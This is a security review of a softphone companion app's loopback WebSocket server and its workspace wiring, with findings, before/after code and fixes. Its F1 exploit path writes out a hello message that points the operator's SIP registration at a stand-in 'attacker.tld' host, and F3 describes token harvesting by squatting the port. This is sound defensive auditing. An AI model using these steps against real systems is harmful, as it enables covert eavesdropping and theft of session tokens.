# Security review — Softphone Companion and its workspace wiring

| | |
|---|---|
| **Date** | 2026-09-15 |
| **Reviewed at** | `0e7ebb34` (`main`) |
| **Scope** | `packages/electron-softphone-companion` (all of `src/`, build and packaging config) and the workspace wiring in `src/app/api/agent-workspace/external-softphone/`, `src/app/api/agent-workspace/websocket/useWebSocketClient.ts`, `src/features/modules/call/call.js` |
| **Out of scope** | the `electron-sip` addon's C++ internals beyond its call surface, the Webitel backend, `packages/electron-workspace` |
| **Method** | source read of every file in scope; no dynamic testing against a live SIP deployment |

Findings marked **fixed** were remediated in the same change that added this
document. The rest are recorded with a recommendation and no code change —
several need decisions (packaging, backend work) that do not belong in a
hardening patch.

## Trust boundary

```
┌─ Browser ──────────────────┐         ┌─ Webitel Softphone Companion ─────┐
│ cc-workspaces (UI)         │         │ Electron main process:            │
│  webitel-sdk Client #1     │  ws://  │  local WS server 127.0.0.1:10029  │
│  registerWebDevice: false  │◄───────►│  webitel-sdk Client #2            │
│  cli.phone = RemotePhone ──┼─answer,─│    (token from web via hello)     │
│                            │  call   │  pjsip (electron-sip addon)       │
└──────────┬─────────────────┘         └───────────┬───────────────────────┘
           │ wss (hangup, hold, dtmf,              │ SIP UDP: REGISTER,
           │ mute, transfer, bridge, ...)          │ INVITE/200 OK + RTP
           ▼                                       ▼
        Webitel engine  ◄──────────────────────────┘
```

The companion is a **tray-only Electron app with no renderer process**: no
`BrowserWindow` is ever constructed, so there is no preload, no `contextBridge`
surface and no IPC. Its entire attack surface is the plaintext loopback
WebSocket server in `src/main/local-server.ts`.

Two properties decide everything below:

1. **A WebSocket client is not bound by the same-origin policy.** Any page the
   operator opens, in any tab, can `new WebSocket('ws://127.0.0.1:10029')`;
   browsers permit this from an `https://` page because the target is loopback.
2. **`hello` supplies both the token *and* the backend the token is validated
   against.** "The backend checks the token" is therefore not an authentication
   result on its own — before this review the client also chose the backend.

Everything on the machine — every local process and every website the operator
visits — sits on the untrusted side of that boundary.

## Findings

### F1 — Unconstrained `hello.endpoint` re-points the operator's SIP device — **Critical — fixed**

`src/main/softphone.ts` accepted whatever endpoint a client sent, and
`src/main/protocol.ts` validated it only as a non-empty string:

```ts
// protocol.ts (before)
[MESSAGE_TYPES.HELLO]: (msg) =>
    typeof msg.token === 'string' && msg.token.length > 0 &&
    typeof msg.endpoint === 'string' && msg.endpoint.length > 0,

// softphone.ts (before)
async handleHello({ token, endpoint }: HelloPayload): Promise<void> {
    const sameSession = this.#cli && this.#token === token && this.#endpoint === endpoint;
    this.#token = token;
    this.#endpoint = endpoint;
    if (sameSession) return;
    await this.restart();
}
```

`#start()` then builds a `webitel-sdk` Client against that endpoint, calls
`cli.deviceConfig('sip')` and hands the result straight to pjsip
(`softphone.ts` `#start`, the `adapter.register({...device})` call).

**Exploit path.** Any local process, or any web page in any tab (F2 left the
origin check open):

1. connect to `ws://127.0.0.1:10029`;
2. send `{v:1, type:'hello', token:'<attacker token>', endpoint:'wss://attacker.tld/ws'}`;
3. `sameSession` is false → `restart()` → `#teardown()` **unregisters the
   operator's real SIP account** and destroys the legitimate session;
4. the attacker's server answers `auth` and `user_default_device {name:'sip'}`
   with SIP credentials of its choosing;
5. pjsip registers against the attacker's proxy. Ringing events after
   `subscribeCall` honour server-side `autoAnswer`, and the app has already
   been granted microphone consent (`com.apple.security.device.audio-input`),
   has no window, and signals nothing beyond a tray icon change.

The result is a covert audio endpoint on the operator's workstation. The
trivial subset — loop step 2 with garbage — keeps the real phone permanently
unregistered.

**Fix.** `endpoint` is now validated as a URL and must be `wss:` (`ws:` only
towards a loopback host, for dev proxies) — `isValidEndpoint` in `protocol.ts`.
`Softphone.handleHello` calls `#assertEndpointAllowed` first: a non-empty
`endpointAllowlist` wins; otherwise the first endpoint that authenticates is
pinned to `config.pairedWorkspace` (`#pairWorkspace`, called immediately after
`cli.auth()` succeeds) and every later `hello` naming a different endpoint is
rejected with `endpoint_not_allowed`. Tray → "Unpair workspace" clears it.

**Residual.** Trust-on-first-use leaves a window on a fresh install, before the
operator has ever logged in, in which an attacker who wins the race pins
*themselves*. Deployments that care should ship `endpointAllowlist`.

### F2 — Origin allowlist defaulted to allow-everything — **High — fixed**

```ts
// config.ts (before)
// non-empty list restricts which web origins may connect to the local
// WebSocket server; empty allows any origin (the hello token is still
// validated against the Webitel backend before anything executes)
originAllowlist: [],

// local-server.ts (before)
#isOriginAllowed(origin: string | undefined): boolean {
    const allowlist = this.#config.originAllowlist;
    if (!Array.isArray(allowlist) || !allowlist.length) return true;
    return typeof origin === 'string' && allowlist.includes(origin);
}
```

Nothing populates the list — neither the installer nor the workspace config —
so every origin was accepted, and so was every client sending no `Origin`
header at all (any non-browser local process). The comment's reasoning is the
mistake identified in *Trust boundary* above: the token is validated against a
backend the same client chose.

**Fix.** When the allowlist is empty the allowed origin is derived from the
pairing instead: once `pairedWorkspace.origin` is set, only that origin may
connect. Both the allowlist and the pairing are read from the live config on
every connection, so unpairing from the tray takes effect without a restart.
Before the first pairing the channel stays open — that window is what F1's
endpoint check closes. Pinning the *observed* origin rather than deriving
it from the endpoint host matters because they differ in dev
(`VITE_WEB_SOCKET_URL`) even though production derives the endpoint from
`window.location`.

**Residual.** `Origin` is trivially forged by any non-browser client, so this
constrains browsers only; it is not a defence against local malware. That is
F3.

### F3 — The workspace hands its access token to an unauthenticated listener — **High — not fixed (needs backend work)**

```ts
// src/app/api/agent-workspace/external-softphone/useExternalSoftphone.ts
function sendHello() {
    send('hello', {
        token: localStorage.getItem('access-token'),
        endpoint,
        protocolVersion: PROTOCOL_VERSION,
    });
}
```

`access-token` is the genuine Webitel session bearer (`src/main.ts` stores it
from the `?accessToken=` query param and sends it as `X-Webitel-Access`). The
browser verifies nothing about the listener: no certificate, no signed
handshake, no challenge, no OS-level peer-credential check. Detection is
"the socket opened" — `probe()` resolves `true` on `onopen` alone.

**Exploit path.** Any unprivileged local process binds `127.0.0.1:10029` before
the companion does and harvests the operator's token on every login, reload and
reconnect. The Electron single-instance lock does not help: whoever binds first
wins, and the real app simply logs `EADDRINUSE`. The reverse direction is just
as open — a rogue listener replies `{type:'state', sipRegistered:true}`, the
browser attaches a `RemotePhone` and lights up the Answer button, and every
`answer`/`call` the operator issues is silently black-holed.

Two local peers with **no shared secret and no trusted introducer cannot
authenticate each other**, and any secret shipped in the workspace bundle is
readable by the same attacker. So every route below works by introducing one of
those two things. In rough order of preference:

1. **Backend-mediated presence** *(needs backend work)*. The companion
   registers its session with the Webitel engine (it already authenticates
   there); the browser asks the engine whether a companion session is live for
   this user instead of trusting whoever answers the port, and addresses it
   through the engine. The loopback socket then carries nothing sensitive.
2. **A pairing secret plus a mutual challenge** *(no backend work)*. The
   companion generates a secret at first run and shows it in the tray; the
   operator enters it once in the workspace settings. The browser then sends
   `challenge {nonce}` as its first frame and only proceeds if the reply
   carries `HMAC(secret, nonce)` — so a squatter that cannot produce the MAC
   never receives the token, and the workspace falls back to the web phone.
   Storing the secret on the workspace origin is not a weakening: anything with
   script execution there already holds the token. Costs one manual pairing
   step per workstation.
3. **A scoped, short-lived handoff token** *(needs backend work)* minted for the
   companion — so a squatter gets a credential that can fetch SIP config and
   nothing else, and only briefly. Shrinks the blast radius from account
   takeover to device impersonation; does not close the hole.
4. **OS-level peer verification** (`SO_PEERCRED`/`LOCAL_PEERCRED`, or matching
   the connecting pid to a signed binary) before the browser sends anything —
   only possible if the handshake moves out of the browser.

One route that looks appealing and does **not** apply: having an Electron
wrapper read a `0600` handshake file (port + secret) written by the companion
and hand it to the page. `packages/electron-workspace` embeds its own pjsip
stack in its preload (`changeSIP`) and is an alternative to this utility rather
than a host for it, so no deployment pairs the two. It would become viable only
if the wrapper's embedded SIP were retired in favour of the companion.

Until one of these lands, this is an accepted risk of the feature, and it is
the reason the feature should stay opt-in per deployment rather than probing by
default (see F10).

### F4 — Command rights granted before the `hello` was accepted — **Medium — fixed**

```ts
// local-server.ts (before)
if (!socket.helloReceived) {
    if (message.type !== MESSAGE_TYPES.HELLO) { socket.close(4001, 'hello_expected'); return; }
    socket.helloReceived = true;              // ← before any validation
    this.emit('hello', message, this.#replier(socket, message.seq));
    return;
}
```

`helloReceived` was set before `softphone.handleHello()` ran, and a failed
hello only acked `ok:false` — it never closed the socket and never reset the
flag. A client whose token the backend refuses kept full `answer`/`call`/
`hangup`/`token` rights and could retry indefinitely.

**Fix.** `LocalServer` now takes an awaitable `onHello` handler instead of
emitting an event. `helloReceived` is set only after it resolves; a rejection
is acked with the `ProtocolError` code and the socket is closed with 4002
`hello_failed`. Messages arriving while a hello is in flight are dropped
(`helloPending`), and `hello` is now dispatched ahead of the
`helloReceived` gate rather than only as the first frame (F15). `Softphone.handleHello` rethrows as `auth_failed` when the
session comes up in `ERROR` state with that cause, so a bad token now closes
the connection — while transient network and registration failures keep their
existing retry behaviour.

### F5 — `call.destination` reached a SIP URI unescaped — **Medium — fixed**

```ts
// protocol.ts (before)
[MESSAGE_TYPES.CALL]: (msg) =>
    typeof msg.destination === 'string' && msg.destination.length > 0,
```

```cpp
// packages/electron-sip/sip_account.cpp
call->makeCall("sip:" + destination + "@" + client->sipServer(), prm);
```

A destination containing `@`, `;`, `?`, `<` or `>` can redirect the INVITE off
the configured proxy or inject URI parameters. The workspace's own sanitizer
(`src/features/modules/call/call.js`, `replace(/[^0-9a-zA-Z+*#]/g, '')`) is
irrelevant here — a client speaking the loopback protocol directly never goes
through it. `params` had no validator at all and was forwarded verbatim into
`cli.call`.

**Fix.** `destination` must match `/^[0-9A-Za-z+*#._-]{1,128}$/` (a superset of
the workspace sanitizer, so no legitimate destination regresses) and `params`
must be absent or a plain object. Escaping in the addon would be the more
complete fix and is worth doing when that code is next touched.

### F6 — No per-connection call ownership — **Medium — not fixed**

`Softphone.answer`/`hangup` look calls up in the process-global SDK call store
by id, so any connected client can answer or hang up any of the operator's
calls. After F1/F2/F4 the set of clients that can reach those commands is much
smaller (paired origin, accepted hello), which is why this is left as is;
a proper fix scopes calls to the connection that owns the session and is worth
doing if the protocol ever grows more commands.

### F7 — `state` broadcast leaks the operator's extension — **Medium — narrowed**

`broadcastState` sends `extension`, `platform`, `appVersion` and `lastError` to
every socket that completed a hello. The SIP extension is a stable corporate
identifier, and before F2 a drive-by page could collect it.

**Narrowed** by F2 (only the paired origin can connect) and F4 (only an
accepted hello receives broadcasts). The payload itself is unchanged; note that
the workspace never renders any of it — `getLastState()` has no call sites.

### F8 — `asar: false` plus permissive entitlements — **Medium — not fixed (packaging decision)**

`package.json` sets `"asar": false`, and `build/entitlements.mac.plist` grants
`disable-library-validation` and `allow-unsigned-executable-memory` (both
genuinely needed by the unsigned `.node` prebuild). Together with the app's
already-granted microphone consent, anyone who can write into the installed
bundle gets code execution under the notarised identity — a clean persistence
and covert-audio primitive. `nsis.allowToChangeInstallationDirectory: true`
lets a Windows install be redirected out of admin-only Program Files.

Recommended: enable `asar` (the addon can stay unpacked via `asarUnpack`), and
drop `allowToChangeInstallationDirectory` so `perMachine` actually implies an
admin-only location.

### F9 — Windows and Linux artifacts unsigned; no update path — **Medium — not fixed (release decision)**

`.github/workflows/build-electron-softphone-companion.yml` signs and notarises
only the macOS job (`CSC_LINK`, `APPLE_*`); the NSIS installer, the Windows zip
and the Linux AppImage ship unsigned. There is also no auto-update mechanism at
all — no `electron-updater`, no `build.publish` — though electron-builder's
`latest*.yml` metadata is uploaded as an artifact.

For a component that parses SIP/SDP/RTP off the network in C++, "no patch
delivery path" is the more serious half. Recommended: sign the Windows
artifacts, and add an HTTPS update feed with signature verification before this
is deployed widely.

### F10 — Workspace did not validate inbound frames — **Low — fixed**

The companion validates every frame it receives; the browser did not. Inbound
JSON was parsed, cast to an interface and acted on — no `v` check, no shape
check — so a rogue listener fully controlled `sipRegistered` and thereby the
registration state machine and the Answer button.

**Fix.** `handleMessage` now rejects non-string data, non-object payloads,
frames whose `v` is not the protocol version, and `state` frames whose
`sipRegistered` is not a boolean.

Related and **not** changed: the workspace retries the loopback connection
forever (the backend socket caps at 10 attempts), and the port is read from
`localStorage['CONFIG']`, which `window._config` overrides at the top of the
config merge in `src/main.ts` — both script-writable on-origin, so the
token-handoff destination is not integrity-protected against an attacker who
already has script execution on the workspace origin. Given F3, hardening the
port source alone buys little.

### F11 — No frame size limit or hello rate limit — **Low — fixed**

The server used `ws`'s 100 MiB default `maxPayload` and accepted unlimited
`hello` frames, each of which triggers a full SIP teardown/register cycle.
Now capped at 64 KiB per frame, and at 5 hello frames per 60 s per connection
(close 4008 `too_many_hellos`). The limit is a sliding window rather than a
lifetime count because the workspace legitimately re-sends `hello` on every
client generation as its token re-handoff — see F15.

### F12 — Validator table reachable through the prototype chain — **Low — fixed**

`VALIDATORS[message.type]` on a plain object literal: `type: "constructor"`
resolved to `Object`, which is truthy, and `Object(msg)` returned truthy, so the
message passed validation. It was contained only by the `default:` arm of the
command switch. The lookup now goes through `Object.hasOwn`.

### F13 — pjsip logs SIP digest material regardless of `debug` — **Low — not fixed (addon change)**

`packages/electron-sip/sip_client.cpp` hardcodes `ep_cfg.logConfig.level = 5`,
which dumps full SIP messages — including `Authorization: Digest … response=` —
to stdout. The companion's own `debug` flag does not control it, and
`logger.ts` does not capture it, so it lands wherever stdout goes. Fixing it
means changing the addon and republishing prebuilds; worth doing on the next
addon release. Setting `config.debug: true` additionally puts the SDK in
verbose mode, whose socket frames include the bearer token — treat debug logs
as credential material.

### F14 — Dependency and supply-chain notes — **Info — not fixed**

- `axios` is a direct dependency of this package but is never imported from
  `src/` — dead surface, remove it.
- `electron-vite` is pinned to `6.0.0-beta.1` in the build path of a signed,
  notarised, microphone-capable artifact. Pin a stable release.
- `packages/electron-sip/prebuilds/**` are binary blobs committed to the repo,
  and `build/ensureElectronSipPrebuild.js` checks only that a `.node` file
  exists — no checksum, no signature. Anyone who can push to that directory
  ships native code to every operator.
- `electron@43.2.0` and `ws@8.21.1` are current (the latter past
  CVE-2024-37890); no EOL major in the tree.

### F15 — Token re-handoff never reached the utility — **Low — fixed**

Found while reviewing F4. The workspace re-sends `hello` on an already-open
socket after every successful `cli.auth()` — that is its documented token
re-handoff ("hello is idempotent on the utility side"). But the server only
treated `hello` specially as the *first* frame; on an established connection it
fell through to the command dispatch, hit its `default:` arm and was acked
`unknown_type`, which the workspace surfaces as an error toast.

So a refreshed token never reached the companion, which kept using the token it
was given at connect time until the socket happened to reconnect. Security
relevance is modest but real: a revoked or rotated token stayed in use in the
process holding the SIP registration.

**Fix.** `hello` is now handled on established connections too, and stays
subject to the same checks; the rate limit became a sliding window so the
legitimate periodic re-handoff cannot exhaust it.

## Structurally clean

Verified absent across the package, so future reviews need not re-derive it:

- no `BrowserWindow`, `webPreferences`, preload script, `contextBridge`,
  `ipcMain`/`ipcRenderer`, or `webContents` — the whole class of Electron
  renderer and preload vulnerabilities does not apply;
- no `loadURL`/`loadFile`, no `will-navigate`/`setWindowOpenHandler`, no
  `shell.openExternal` (the two `shell` calls are tray items with constant
  `userData` paths);
- no `child_process`/`exec`/`spawn`, no `eval`/`new Function`, no DOM sinks;
- no `app.commandLine` switches, no `--inspect`/`--remote-debugging-port`, no
  unconditional devtools, no `setCertificateVerifyProc`;
- no custom protocol handler or deep link, so no `argv`-injection surface;
- the WS server binds `127.0.0.1` only, never `0.0.0.0`;
- tokens and SIP credentials are held in memory only, never written to
  `config.json`, and no credential is passed to `logger.*` (which serialises
  whatever it is given — keep it that way);
- `config.dev.json` is gitignored and `devConfig()` returns `null` when
  `app.isPackaged`.

## Follow-up

| | |
|---|---|
| Blocking wide rollout | F3 (route 1 or 2), F9 (signing + update path) |
| Next packaging change | F8 |
| Next `electron-sip` release | F13, F5's escaping half |
| Housekeeping | F6, F14 |

F3 route 2 (pairing secret + mutual challenge) is the only one that needs no
backend work, so it is the cheapest way to unblock a wide rollout if route 1 is
not scheduled.

**Adjacent, not audited.** `packages/electron-workspace` — explicitly out of
this review's scope — loads a remote URL into a `BrowserWindow` configured with
`contextIsolation: false`, `nodeIntegration: true` and `enableRemoteModule:
true`, with a preload that assigns `window.ipcRenderer = ipcRenderer`. Whatever
the workspace origin serves therefore runs with full Node access in the
renderer. Noted here only so it is not lost; it deserves its own review.
